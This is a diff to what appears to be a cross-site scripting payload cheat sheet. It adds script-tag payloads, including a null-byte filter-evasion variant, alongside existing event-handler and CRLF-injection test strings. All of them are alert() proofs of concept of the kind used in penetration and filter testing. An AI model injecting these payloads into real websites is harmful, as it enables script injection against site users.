@@ -2,7 +2,10 @@ XSS
 
 CRLF %0D%0A
 
-
+<script>alert("xss")</script>
+<script>alert(1);</script>
+<%00script>alert(1)</%00script>
+SCRIPT>alert("XSS");///SCRIPT
 <a onmouseover=alert('hi')>Hover over me</a>
 <img src=x onerror=alert('hi')>
 <svg onload=alert('hi')>
